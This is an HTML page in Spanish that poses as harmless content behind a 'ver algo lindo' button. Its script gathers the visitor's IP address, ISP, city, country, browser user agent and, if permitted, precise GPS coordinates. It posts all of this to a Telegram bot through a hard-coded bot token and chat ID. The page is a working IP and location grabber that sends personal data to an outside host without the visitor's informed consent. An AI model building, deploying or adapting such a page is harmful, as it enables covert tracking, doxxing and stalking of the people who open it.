<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Info Rápida</title>
  <link
    rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
    crossorigin=""
  />
  <style>
    body {
      font-family: Arial;
      padding: 20px;
      background: #f0f0f0;
      margin: 0;
    }
    .box {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 100%;
      box-sizing: border-box;
    }
    #map {
      height: 300px;
      margin-top: 15px;
      border-radius: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Haz click en el botón y rechaza la ubicación</h2>
    <button onclick="collectAndSend()">ver algo lindo</button>
    <pre id="result">...</pre>
    <div id="map"></div>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
  <script>
    const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
    const CHAT_ID = "6065284869";

    const resultEl = document.getElementById("result");
    const mapEl = document.getElementById("map");

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
      }).catch(() => {});
    }

    function getIPInfo() {
      return fetch("https://ipapi.co/json/").then(res => res.json());
    }

    function collectAndSend() {
      resultEl.textContent = "📡 Recopilando información rápida...";

      const geoPromise = new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
        } else reject();
      });

      Promise.allSettled([getIPInfo(), geoPromise]).then(([ipRes, geoRes]) => {
        let message = "";

        if (ipRes.status === "fulfilled") {
          const ip = ipRes.value;
          message += `IP: ${ip.ip}\nISP: ${ip.org}\nCiudad: ${ip.city}\nRegión: ${ip.region}\nPaís: ${ip.country_name}\n`;
        } else {
          message += "No se pudo obtener IP\n";
        }

        message += `User-Agent: ${navigator.userAgent}\nHora: ${new Date().toLocaleString()}\n`;

        resultEl.textContent = message;
        sendToTelegram(message);

        if (geoRes.status === "fulfilled") {
          const { latitude, longitude, accuracy } = geoRes.value.coords;
          const locationInfo = `Lat: ${latitude}\nLon: ${longitude}\nPrecisión: ${accuracy}m`;
          resultEl.textContent += "\n" + locationInfo;
          sendToTelegram(locationInfo);

          setTimeout(() => {
            mapEl.style.display = "block";
            const map = L.map("map").setView([latitude, longitude], 14);
            L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
              attribution: '&copy; OpenStreetMap contributors'
            }).addTo(map);
            L.marker([latitude, longitude]).addTo(map).bindPopup("Tu ubicación").openPopup();
          }, 100);
        } else {
          console.log("Ubicación denegada o falló.");
        }
      });
    }
  </script>
</body>
</html>
